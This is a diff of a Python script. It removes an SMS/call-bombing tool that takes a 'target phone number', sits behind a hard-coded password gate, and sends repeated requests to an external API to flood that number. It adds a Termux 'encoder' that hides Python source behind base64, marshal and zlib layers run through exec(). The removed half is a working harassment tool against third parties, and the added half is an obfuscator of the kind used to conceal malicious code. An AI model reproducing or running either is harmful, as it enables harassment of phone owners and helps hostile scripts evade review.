@@ -1,226 +1,244 @@
-#!/usr/bin/env python3
+#-----------------[ MODULE ]-------------------#
 import os
-import sys
-import time
-import socket
-import hashlib
-import subprocess
-from importlib import import_module
+def modules():
+	os.system('pkg update -y && pkg upgrade -y')
+	os.system('clear')
+	try: 
+		import rich
+	except ModuleNotFoundError:
+		print("\33[1;96m>>\x1b[1;97m RICH IS BEING INSTALLED \033[1;37m")
+		os.system('pip install rich --quiet')
+		print("\33[1;96m>>\x1b[1;97m RICH HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	try:
+		import bs4
+	except ModuleNotFoundError:
+		print("\33[1;96m>>\x1b[1;97m BS4 IS BEING INSTALLED \033[1;37m")
+		os.system('pip install bs4 --quiet')
+		print("\33[1;96m>>\x1b[1;97m BS4 HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	try:
+		import requests
+	except ModuleNotFoundError:
+		print("\33[1;96m>>\x1b[1;97m REQUESTS IS BEING INSTALLED \033[1;37m")
+		os.system('pip install requests --quiet')
+		print("\33[1;96m>>\x1b[1;97m REQUESTS HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	exit()
+try:
+	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket,marshal
+	import os, requests, marshal, zlib, base64
+	from bs4 import BeautifulSoup as bs
+	from bs4 import BeautifulSoup
+	import urllib3,rich,base64
+	from rich.table import Table as me
+	from rich.console import Console as sol
+	from bs4 import BeautifulSoup as sop
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from rich.console import Group as gp
+	from rich.panel import Panel as nel
+	from rich.panel import Panel
+	from rich.tree import Tree
+	from rich.panel import Panel as nel
+	from rich.panel import Panel as panel
+	from rich import print as cetak
+	from rich.markdown import Markdown as mark
+	from rich.columns import Columns as col
+	from rich import print as prints
+	from rich import pretty
+	from rich.text import Text as tekz
+	from time import localtime as lt	
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+	pretty.install()
+	CON=sol()
+except ModuleNotFoundError:
+	modules()	
+#------------[ COLOR ]--------------#
+P = '\x1b[1;97m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[38;5;50m'
+Z = "\x1b[38;5;83m"
+X = "\x1b[38;5;46m"
+m = '\x1b[1;91m'
+b = '\33[1;96m'	
+#---------------------[IP]---------------------#
+try:
+	net = requests.get("http://ip-api.com/json/").json()["isp"]
+	ipxx = requests.get("https://api.ipify.org").text    
+except requests.exceptions.ConnectionError:
+	print('\033[1;37m—————————————————————————\x1b[1;97m')
+	print("\33[1;96m>>\x1b[1;97m CHECK YOUR INTERNET")
+	time.sleep(1)
+	exit()
+#------------------[ CUTS ]---------------#
+def clear():
+    os.system('clear')
+def back():
+    encodee()	
+def line():
+    print('\033[1;37m—————————————————————————————————————————————\x1b[1;97m')
+def animation(u):
+    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)    
+#------------------[ LOGO ]-----------------#
+logo =f"""  
+  _____________   ____
+ /   _____/\   \ /   /
+ \_____  \  \   Y   /   
+ /        \  \     /   \33[1;97mOWNER   : SAURAV DADA
+/_______  /   \___/    \33[1;97mGITHUB  : Saureyy 
+        \/             \33[1;97mVERSION : \33[1;96mENCODE\33[1;97m
+\033[1;37m—————————————————————————————————————————————\x1b[1;97m
+-fuwk3rrr saura'v herrr'w - laud3y !-
+\033[1;37m—————————————————————————————————————————————\x1b[1;97m"""       
+#-------------[ ENCODE encodee ]------------------#           		
+def encodee():
+	clear()
+	print(logo)
+	print("\33[1;96m>>\x1b[1;97m YOUR INTERNET   :\033[1;99m "+net)
+	print("\33[1;96m>>\x1b[1;97m IP ADDRESS      :\033[1;36m "+ipxx)
+	line()
+	print(f"""\33[1;96m>>\x1b[1;97m 1 \33[1;96m×\x1b[1;97m ENCRYPT BASE16""")
+	print(f"""\33[1;96m>>\x1b[1;97m 2 \33[1;96m×\x1b[1;97m ENCRYPT BASE32""")    
+	print(f"""\33[1;96m>>\x1b[1;97m 3 \33[1;96m×\x1b[1;97m ENCRYPT BASE64""")    
+	print(f"""\33[1;96m>>\x1b[1;97m 4 \33[1;96m×\x1b[1;97m ENCRYPT MARSHAL""")    
+	print(f"""\33[1;96m>>\x1b[1;97m 5 \33[1;96m×\x1b[1;97m ENCRYPT MARSHAL-ZLIB-BASE16""") 
+	print(f"""\33[1;96m>>\x1b[1;97m 6 \33[1;96m×\x1b[1;97m ENCRYPT MARSHAL-ZLIB-BASE32""") 
+	print(f"""\33[1;96m>>\x1b[1;97m 7 \33[1;96m×\x1b[1;97m ENCRYPT MARSHAL-ZLIB-BASE64""") 
+	print(f"""\33[1;96m>>\x1b[1;97m 0 \33[1;96m×\x1b[1;97m EXIT THE TOOL""")    
+	line()    
+	saureyxx=input('\33[1;96m>>\x1b[1;97m CHOOSE : ')
+	if saureyxx in ['1']:
+		x1()        
+	elif saureyxx in ['2']:
+		x2()    	
+	elif saureyxx in ['3']:
+		x3()
+	elif saureyxx in ['4']:
+		x4()   
+	elif saureyxx in ['5']:
+		x5()
+	elif saureyxx in ['6']:
+		x6()
+	elif saureyxx in ['7']:
+		x7()   
+	else:
+		exit ()        	    
+#__________________|  All Method |__________________#
+def x1():
+    line();saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+    line()
+    ups = open(saureyxx, 'rb').read()
+    ui = base64.b16encode(ups)
+    output = saureyxx.replace('.py', '') + '_enc.py'
+    cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\n import base64\nexec(base64.b16decode(' + str(ui) + '))')
+    print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+    line()
+    print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+    line()
+    xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
 
-# Constants
-PASSWORD = "dzdemonic"
-PASSWORD_LINK = ""
-STARTUP_LINK = ""
-API_URL = "https://dzsmscall-abu-rashids-projects.vercel.app/api/test?phone="
-HASH_FILE = "verified_hashes.txt"
+def x2():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	ups = open(saureyxx, 'rb').read()
+	ui = base64.b32encode(ups)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport base64\nexec(base64.b32decode(' + str(ui) + '))')
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line()
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()  
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+	
+def x3():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	ups = open(saureyxx, 'rb').read()
+	ui = base64.b64encode(ups)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport base64\nexec(base64.b64decode(' + str(ui) + '))')
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line()
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+	
+def x4():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	fileopen = open(saureyxx, 'rb').read()
+	a = compile(fileopen, 'dg', 'exec')
+	m = marshal.dumps(a)
+	s = repr(m)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport marshal\nexec(marshal.loads(' + s + '))')
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line()
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
 
-# Required modules with their import names and pip names
-REQUIRED_MODULES = {
-    'requests': 'requests',
-    'prompt_toolkit': 'prompt-toolkit',
-    'pyfiglet': 'pyfiglet',
-    'termcolor': 'termcolor',
-    'simple_chalk': 'simple-chalk',
-    'halo': 'halo',
-    'rich': 'rich',
-}
-
-# Auto-install missing modules
-def install_modules():
-    missing_modules = []
-    for module, pip_name in REQUIRED_MODULES.items():
-        try:
-            import_module(module)
-        except ImportError:
-            missing_modules.append(pip_name)
-    
-    if missing_modules:
-        print("\033[1;33m⚡ Installing missing dependencies...\033[0m")
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + missing_modules,
-                                 stdout=subprocess.DEVNULL,
-                                 stderr=subprocess.DEVNULL)
-            print("\033[1;32m✅ Dependencies installed successfully!\033[0m")
-            time.sleep(1)
-        except subprocess.CalledProcessError:
-            print("\033[1;31m❌ Failed to install dependencies. Try manually with: pip install", " ".join(missing_modules), "\033[0m")
-            sys.exit(1)
-
-# Now import all modules after ensuring they're installed
-install_modules()
-
-from prompt_toolkit import prompt
-from prompt_toolkit.styles import Style
-from prompt_toolkit.formatted_text import HTML
-from prompt_toolkit.shortcuts import ProgressBar
-from pyfiglet import Figlet
-from termcolor import colored
-from simple_chalk import chalk
-from halo import Halo
-from rich.console import Console
-from rich.panel import Panel
-from rich.progress import track
-from rich.text import Text
-import requests
-
-# Initialize rich console
-console = Console()
-
-# Custom Styles
-style = Style.from_dict({
-    '': '#ff6f00 bold',
-    'prompt': '#00ff00 bold',
-    'input': '#ffffff bg:#444444',
-    'output': '#00ffff',
-    'error': '#ff0000 bold',
-    'success': '#00ff00 bold',
-    'warning': '#ffff00 bold',
-    'info': '#00ffff',
-})
-
-# ASCII Header with Animation
-def animated_header():
-    os.system("clear")
-    f = Figlet(font='doom')
-    print(colored(f.renderText('DZ DEMONIC'), 'red'))
-    print(chalk.blue.bold("🔥 ONE OF THE MOST POWERFUL BEAST TOOL 🔥"))
-    print(chalk.yellow("━" * 60))
-
-# Custom Box implementation using rich
-def create_box(content, title="", color="red"):
-    color_map = {
-        "red": "red1",
-        "green": "green1",
-        "yellow": "yellow1",
-        "blue": "blue1",
-    }
-    panel = Panel(
-        Text(content, justify="center"),
-        title=title,
-        border_style=color_map.get(color, "red1"),
-        width=60,
-        padding=(1, 2)
-    )
-    console.print(panel)
-
-# IP and Hashing
-def get_ip():
-    with Halo(text='Fetching your IP address', spinner='dots'):
-        try:
-            ip = requests.get("https://api.ipify.org").text.strip()
-            return ip
-        except:
-            return socket.gethostbyname(socket.gethostname())
-
-def hash_ip(ip):
-    return hashlib.sha256(ip.encode()).hexdigest()
-
-def is_verified(ip_hash):
-    if not os.path.exists(HASH_FILE):
-        return False
-    with open(HASH_FILE, "r") as f:
-        return ip_hash in f.read().splitlines()
-
-def save_verified_ip(ip_hash):
-    with open(HASH_FILE, "a") as f:
-        f.write(ip_hash + "\n")
-
-# Open browser in Termux
-def open_link(link):
-    os.system(f"xdg-open '{link}' > /dev/null 2>&1")
-
-# Animated Progress Bar
-def show_progress():
-    console.print("[green]Loading Demon Power...[/green]")
-    for _ in track(range(100), description="Initializing..."):
-        time.sleep(0.02)
-
-# Send requests with visual feedback
-def send_requests(phone):
-    console.print("\n[red bold]⚡ INITIATING DEMONIC ATTACK SEQUENCE ⚡[/red bold]")
-    print(chalk.yellow("━" * 60))
-    
-    with Halo(text='Preparing dark magic', spinner='hearts'):
-        time.sleep(2)
-    
-    for i in range(10):
-        try:
-            response = requests.get(API_URL + phone)
-            percent = (i+1) * 10
-            bar = "█" * (percent//5) + " " * (20 - (percent//5))
-            print(f"\r{chalk.green.bold(f'[{i+1}/10]')} {chalk.blue('[' + bar + ']')} {chalk.yellow(f'{percent}%')} {chalk.green('✔ Request sent')}", end='')
-            time.sleep(1)
-        except Exception as e:
-            print(f"\r{chalk.red.bold(f'[{i+1}/10]')} {chalk.red('✖ Error:')} {chalk.white(str(e))}", end='')
-            time.sleep(1)
-    print()
-
-# Main logic with enhanced UI
-def main():
-    try:
-        animated_header()
-        show_progress()
-        
-        user_ip = get_ip()
-        ip_hash = hash_ip(user_ip)
-        
-        create_box(f"Your IP: {user_ip}\nHashed: {ip_hash[:8]}...", "IP INFORMATION", "red")
-        
-        console.print("\n[cyan bold]🔗 Opening the Gates to Telegram Channel...[/cyan bold]")
-        with Halo(text='Redirecting', spinner='dots'):
-            time.sleep(2)
-            open_link(STARTUP_LINK)
-
-        if not is_verified(ip_hash):
-            create_box("Access to the demonic powers requires verification", "WARNING", "yellow")
-            choice = prompt(HTML('<prompt>🔐 Do you wish to continue? (y/n): </prompt>'), style=style)
-            if choice.lower() == 'y':
-                console.print("\n[cyan]Opening password portal...[/cyan]")
-                open_link(PASSWORD_LINK)
-                password = prompt(HTML('<prompt>🔑 Enter the demonic password: </prompt>'), style=style, is_password=True)
-                if password != PASSWORD:
-                    create_box("INCORRECT PASSWORD - ACCESS DENIED", "ERROR", "red")
-                    console.print("\n[red bold]The demon rejects your offering...[/red bold]")
-                    return
-                save_verified_ip(ip_hash)
-                create_box("PASSWORD ACCEPTED - WELCOME TO THE DARK SIDE", "SUCCESS", "green")
-            else:
-                create_box("COWARDICE DETECTED - EXITING", "WARNING", "yellow")
-                return
-        else:
-            create_box("IP VERIFIED - WELCOME BACK, USER🔥", "SUCCESS", "green")
-
-        phone = prompt(HTML('<prompt>📲 Enter target phone number (e.g., 017xxxxxxxx): </prompt>'), style=style)
-        if not phone.isdigit():
-            create_box("INVALID NUMBER - MUST CONTAIN DIGITS ONLY", "ERROR", "red")
-            return
-
-        console.print("\n[red bold]🔥 PREPARING DEMONIC ASSAULT 🔥[/red bold]")
-        print(chalk.yellow("━" * 60))
-        
-        # Countdown animation
-        for i in range(3, 0, -1):
-            print(f"\r{chalk.red.bold(f'Launching attack in {i}...')}", end='')
-            time.sleep(1)
-        print("\r" + " " * 30 + "\r", end='')
-        
-        send_requests(phone)
-        
-        # Final animation
-        console.print("\n[red bold]⚡ ATTACK COMPLETE ⚡[/red bold]")
-        with Halo(text='Cleaning up dark energy', spinner='dots'):
-            time.sleep(2)
-        
-        create_box("MISSION ACCOMPLISHED - DZ DEMON SIGNING OFF", "SUCCESS", "green")
-        print(chalk.yellow("━" * 60))
-        console.print("[red bold]THE DEMON RETURNS TO THE SHADOWS...[/red bold]")
-
-    except KeyboardInterrupt:
-        create_box("DEMONIC RITUAL INTERRUPTED", "WARNING", "yellow")
-        console.print("\n[red bold]The demon growls in frustration...[/red bold]")
-    except Exception as e:
-        console.print(f"[red bold]UNHANDLED ERROR: {str(e)}[/red bold]")
-        console.print("\n[red bold]The demon has encountered a problem...[/red bold]")
-
-if __name__ == "__main__":
-    main()
+def x5():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	fileopen = open(saureyxx, 'rb').read()
+	a = compile(fileopen, 'dg', 'exec')
+	m = marshal.dumps(a)
+	z = zlib.compress(m)
+	b = base64.b16encode(z)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b16decode(' + str(b) + '))))')
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+	
+def x6():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	fileopen = open(saureyxx, 'rb').read()
+	a = compile(fileopen, 'dg', 'exec')
+	m = marshal.dumps(a)
+	z = zlib.compress(m)
+	b = base64.b32encode(z)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b32decode(' + str(b) + '))))') 
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line()
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+	
+def x7():
+	line()
+	saureyxx = input('\33[1;96m>>\x1b[1;97m FILE NAME : ')
+	line()
+	fileopen = open(saureyxx, 'rb').read()
+	a = compile(fileopen, 'dg', 'exec')
+	m = marshal.dumps(a)
+	z = zlib.compress(m)
+	b = base64.b64encode(z)
+	output = saureyxx.replace('.py', '') + '_enc.py'
+	cok = open(output, 'w').write('#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!\n#——————————————————————————————————————\nimport marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b64decode(' + str(b) + '))))')
+	print(f"\33[1;96m>>\x1b[1;97m SUCCESSFULLY ENCRYPTED : %s" % saureyxx)
+	line()
+	print(f"\33[1;96m>>\x1b[1;97m SAVED AS : \33[1;96m%s" % output)
+	line()	
+	xxz = input('\33[1;96m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+#-----------------------[ SYSTEM ]--------------------#
+if __name__=='__main__':
+	try:os.mkdir('/sdcard/Saureyy')	    
+	except:pass
+	try:os.mkdir('data')
+	except:pass
+	encodee()	
